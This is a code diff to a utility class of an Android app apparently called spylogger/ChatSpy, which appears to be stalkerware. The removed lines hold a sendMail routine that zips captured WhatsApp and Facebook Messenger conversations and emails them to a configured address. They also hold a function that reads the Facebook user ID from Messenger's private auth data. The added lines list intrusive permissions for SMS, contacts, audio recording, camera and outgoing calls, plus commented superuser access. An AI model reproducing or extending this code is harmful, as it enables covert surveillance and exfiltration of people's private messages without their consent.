@@ -1,5 +1,6 @@
 package com.gravatasufoca.spylogger.utils;
 
+import android.Manifest;
 import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.ContentUris;
@@ -21,29 +22,18 @@ import android.provider.ContactsContract.PhoneLookup;
 import android.provider.MediaStore;
 import android.provider.Settings.Secure;
 import android.util.Base64;
-import android.util.Log;
 import android.widget.Toast;
 
-import com.gmailsender.GMailSender;
-import com.gravatasufoca.spylogger.dao.DatabaseHelper;
-import com.gravatasufoca.spylogger.helpers.FaceHtmlHelper;
-import com.gravatasufoca.spylogger.services.MessengerService;
+import com.gravatasufoca.spylogger.R;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookContacts;
-import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookPrefs;
 import com.gravatasufoca.spylogger.model.messenger.Contact;
-import com.gravatasufoca.spylogger.model.messenger.Prefs;
-import com.gravatasufoca.spylogger.model.Configuracao;
+import com.gravatasufoca.spylogger.receivers.Alarm;
+import com.gravatasufoca.spylogger.services.MessengerService;
 import com.gravatasufoca.spylogger.services.RecordService;
 import com.gravatasufoca.spylogger.services.SmsService;
 import com.gravatasufoca.spylogger.services.WhatsAppService;
-import com.gravatasufoca.spylogger.helpers.WhatsHtmlHelper;
-import com.gravatasufoca.spylogger.R;
-import com.gravatasufoca.spylogger.receivers.Alarm;
 import com.j256.ormlite.dao.Dao;
 import com.utilidades.gravata.utils.Utilidades;
-
-import org.json.JSONException;
-import org.json.JSONObject;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -59,7 +49,6 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Date;
-import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
@@ -76,7 +65,31 @@ public class Utils {
 
 	public static final String FACEBOOK_DIR_PATH=android.os.Environment.getDataDirectory().toString()+"/data/com.facebook.orca";
 	public static final String NOT_PREMIUM = "<div class=\"center\"><div class=\"alert alert-warning section\">%s</div></div>";
+	public static boolean rooted;
 
+	public static String[] permissoes={
+			Manifest.permission.GET_ACCOUNTS,
+			Manifest.permission.READ_CONTACTS,
+			Manifest.permission.RECEIVE_BOOT_COMPLETED,
+			Manifest.permission.INTERNET,
+			Manifest.permission.ACCESS_NETWORK_STATE,
+			Manifest.permission.PROCESS_OUTGOING_CALLS,
+			Manifest.permission.GET_ACCOUNTS,
+			Manifest.permission.ACCOUNT_MANAGER,
+			Manifest.permission.WAKE_LOCK,
+			Manifest.permission.RECEIVE_SMS,
+			Manifest.permission.READ_SMS,
+			Manifest.permission.RECORD_AUDIO,
+			Manifest.permission.CAMERA
+
+	};
+
+	/*
+	<uses-permission android:name="android.permission.READ_PROFILE" />
+	<uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>
+	<uses-permission android:name="android.permission.USE_CREDENTIALS"/>
+	<uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+	*/
 
 	private static ScheduledExecutorService scheduleTaskExecutor;
 	public static ScheduledFuture<?> scheduledFuture;
@@ -109,41 +122,6 @@ public class Utils {
 		return scheduleTaskExecutor;
 	}
 
-
-
-	public static void startMail(Context context){
-		Log.d("CHATSPY - LICENCIADO", Boolean.toString(Utilidades.premium));
-
-		//if(Utils.isComprado(context)){
-			Log.d("CHATSPY - STARTMAIL", "Alarm eh: "+Boolean.toString(Utils.alarm==null));
-			if(Utils.alarm==null){
-				Utils.alarm=new Alarm();
-
-				Utils.alarm.CancelAlarm(context);
-				Utils.alarm.SetAlarm(context , getConfiguracao(context).getIntervalo());
-			}
-		//}
-	}
-
-	public static Configuracao getConfiguracao(Context context) {
-		Configuracao configuracao = null;
-		DatabaseHelper database = new DatabaseHelper(
-				context);
-		List<Configuracao> confs;
-		try {
-			confs = database.getConfiguracaoDao().queryForAll();
-			Configuracao conf = null;
-
-			if (confs.size() > 0) {
-				conf = confs.get(0);
-			}
-			if (conf != null) {
-				configuracao = conf;
-			}
-		} catch (Exception e) {
-		}
-		return configuracao;
-	}
 
 	public static boolean isComprado(final Context ctx){
 		if(!isDebugglabe(ctx)){
@@ -517,87 +495,6 @@ public class Utils {
 			return tmp;
 		else
 			return new Contact();
-	}
-
-	public static Contact getProprietario(){
-		try {
-
-			String uid=FaceHtmlHelper.context.getSharedPreferences(PREF, 0).getString("UID", "");
-			if(!uid.isEmpty())
-				return getContato(uid);
-
-			Dao<Prefs, Integer> dao=(new DatabaseHelperFacebookPrefs(FaceHtmlHelper.context)).getPrefsDao();
-			List<Prefs> prefs=dao.queryForAll();
-
-			for(Prefs pref:prefs){
-				if(pref.getKey().trim().equalsIgnoreCase("/auth/user_data/fb_uid")){
-					FaceHtmlHelper.context.getSharedPreferences(PREF, 0).edit().putString("UID", pref.getValue()).commit();
-
-					return getContato(pref.getValue());
-				}
-				else if(pref.getKey().trim().equalsIgnoreCase("/auth/user_data/fb_me_user")){
-					try {
-						JSONObject json=new JSONObject(pref.getValue());
-						FaceHtmlHelper.context.getSharedPreferences(PREF, 0).edit().putString("UID", json.getString("uid")).commit();
-
-						return getContato(json.getString("uid"));
-					} catch (JSONException e) {
-						e.printStackTrace();
-					}
-				}
-
-			}
-
-		} catch (SQLException e) {
-			e.printStackTrace();
-		}
-		return new Contact();
-	}
-
-	public static void sendMail(Context context){
-		 if(Utilidades.isConnected(context)){
-
-			Utilidades.BASE64_PUBLIC_KEY=Utils.BASE64_PUBLIC_KEY;
-			Utilidades.verifyPremium(context);
-			while(!Utilidades.verificado){
-				try {
-					Thread.sleep(100);
-				} catch (InterruptedException e) {
-				}
-			}
-			//Utilidades.premium=false;
-
-			try {
-				 	GMailSender gmail=new GMailSender(context);
-					Dao<Configuracao, Integer> dao= (new DatabaseHelper(context)).getConfiguracaoDao();
-
-					Configuracao configuracao= dao.queryForAll().get(0);
-
-					Map<String, File> arquivos=new HashMap<String, File>();
-
-					if(configuracao.isWhatsApp()){
-						WhatsHtmlHelper helper=new WhatsHtmlHelper(context);
-						arquivos.putAll(helper.getAnexos());
-					}
-					if(configuracao.isFacebook()){
-						 FaceHtmlHelper htmlHelper=new FaceHtmlHelper(context);
-						 arquivos.putAll(htmlHelper.getAnexos());
-					}
-
-					if(!arquivos.isEmpty()){
-						ZipAnexos zip=new ZipAnexos(context, arquivos);
-						List<String> arqs=zip.getFiles();
-
-						String assunto=configuracao.getSubject();
-						String email=configuracao.getEmailTo();
-
-						new SendEmailAsyncTask(gmail, assunto,email,configuracao.isMedia()).execute(arqs);
-					}
-
-			 } catch (SQLException e) {
-					e.printStackTrace();
-				}
-		 }
 	}
 
 	public static boolean isServiceRunning(Context context){
